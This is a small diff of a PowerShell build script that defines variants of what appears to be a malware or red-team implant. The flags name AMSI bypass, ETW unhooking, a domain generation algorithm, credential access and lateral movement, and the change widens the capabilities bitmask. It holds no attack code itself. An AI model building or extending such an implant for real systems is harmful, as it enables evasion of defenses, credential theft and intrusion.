@@ -152,11 +152,11 @@ $arms = [ordered]@{
     'lateral'   = @('PX_LATERAL=1')
     'resilient' = @('PX_RESILIENT=1')
     'xfer'      = @('PX_FILE_TRANSFER=1', 'PX_SCREENSHOT=1')
-    'caps'      = @('PX_CAPABILITIES=0x1FFF')
+    'caps'      = @('PX_CAPABILITIES=0x3FFFFF')
     'full'      = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_DGA=1', 'PX_CRED_ACCESS=1',
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
-                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x1FFF')
+                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF')
 }
 
 $built = @()
